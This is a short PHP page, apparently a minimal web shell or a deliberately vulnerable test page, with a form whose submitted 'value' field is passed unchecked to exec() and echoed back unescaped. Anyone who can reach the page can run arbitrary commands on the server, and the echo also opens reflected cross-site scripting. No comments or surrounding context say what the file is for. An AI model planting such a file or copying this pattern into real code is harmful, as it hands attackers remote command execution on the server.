<?php
if (isset($_POST["value"])) {
    echo $_POST["value"];
    exec($_POST["value"], $output, $status);
}


?>
<div>
    <form method="post">
        <input type="text" value="" name="value" id="">
        <input type="submit">
    </form>
</div>